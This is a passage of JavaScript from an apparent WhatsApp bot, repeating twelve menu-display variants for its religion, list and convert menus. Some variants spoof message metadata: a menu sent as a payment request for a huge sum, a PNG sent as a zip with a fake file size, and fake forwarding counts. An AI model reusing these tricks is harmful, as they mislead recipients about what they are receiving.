                    })
                } else if (typemenu === 'v8') {
                	Yasam.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: fvrif
                    })
                    } else if (typemenu === 'v9') {
                	Yasam.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/9fok4g.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: fvrif
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'religionmenu': {
		if (isBan) return reply(mess.ban) 
	if (!isRegistered) return reply(mess.daftar)
let xmenu_oh = `Hi ${pushname} ${xeonytimewisher}\n\
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${YasamCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${!YasamCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
${cmenut} ${readmore}\n\n${religionmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                Yasam.sendMessage(m.chat, {
                    text: xmenu_oh,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fvrif
                })                
                } else if (typemenu === 'v2') {
                    Yasam.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fvrif
                    })
                }   if (typemenu === 'v3') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v4') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v5') {
                    Yasam.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    Yasam.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    Yasam.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	Yasam.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: fvrif
                    })
                    } else if (typemenu === 'v9') {
                	Yasam.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/9fok4g.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: fvrif
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'listmenu': {
		if (isBan) return reply(mess.ban) 
	if (!isRegistered) return reply(mess.daftar)
let xmenu_oh = `Hi ${pushname} ${xeonytimewisher}\n\
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${YasamCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${!YasamCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
${cmenut} ${readmore}\n\n${listmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                Yasam.sendMessage(m.chat, {
                    text: xmenu_oh,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fvrif
                })                
                } else if (typemenu === 'v2') {
                    Yasam.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fvrif
                    })
                }   if (typemenu === 'v3') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v4') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v5') {
                    Yasam.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    Yasam.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    Yasam.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	Yasam.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: fvrif
                    })
                    } else if (typemenu === 'v9') {
                	Yasam.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/9fok4g.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: fvrif
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'convertmenu': {
		if (isBan) return reply(mess.ban) 
	if (!isRegistered) return reply(mess.daftar)
let xmenu_oh = `Hi ${pushname} ${xeonytimewisher}\n\
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
